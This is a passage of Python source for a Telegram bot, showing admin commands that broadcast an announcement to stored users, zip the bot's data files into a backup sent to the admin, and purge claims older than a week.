        await update.message.reply_text("Usage:\n`/broadcast Your message here`", parse_mode="Markdown")
        return

    message = " ".join(context.args)
    accounts = load_json(ACCOUNTS_FILE, {})
    user_ids = list(set(info.get("uid") for info in accounts.values() if info.get("uid")))

    success = 0
    failed = 0
    status = await update.message.reply_text(f"📢 Sending to {len(user_ids)} users...")

    for uid in user_ids:
        try:
            await context.bot.send_message(uid, f"📢 **Announcement**\n\n{message}", parse_mode="Markdown")
            success += 1
        except:
            failed += 1

    await status.edit_text(f"✅ Broadcast Done!\nSuccess: `{success}`\nFailed: `{failed}`", parse_mode="Markdown")


async def backup_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: /backup"""
    if not is_admin(update.effective_user.id):
        return

    backup_path = f"{DATA_DIR}/backup_{datetime.now().strftime('%Y%m%d_%H%M')}.zip"
    files_to_backup = [
        ACCOUNTS_FILE, BALANCES_FILE, CLAIMS_FILE, REFS_FILE,
        SETTINGS_FILE, ADMINS_FILE, CODES_FILE, FROZEN_FILE
    ]

    with zipfile.ZipFile(backup_path, "w") as zf:
        for f in files_to_backup:
            if os.path.exists(f):
                zf.write(f, os.path.basename(f))

    await update.message.reply_document(
        document=open(backup_path, "rb"),
        filename=os.path.basename(backup_path),
        caption="📦 Full Bot Backup"
    )


async def cleanclaims_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: /cleanclaims"""
    if not is_admin(update.effective_user.id):
        return

    claims = load_json(CLAIMS_FILE, {})
    now = datetime.now()
    new_claims = {}
    deleted = 0

    for cid, data in claims.items():
        if data.get("done"):
            try:
                claim_time = datetime.fromisoformat(data["time"])
                if (now - claim_time).days > 7:
                    deleted += 1
                    continue
            except:
                pass
        new_claims[cid] = data

    save_json(CLAIMS_FILE, new_claims)
    await update.message.reply_text(f"🧹 Cleaned `{deleted}` old claims.")
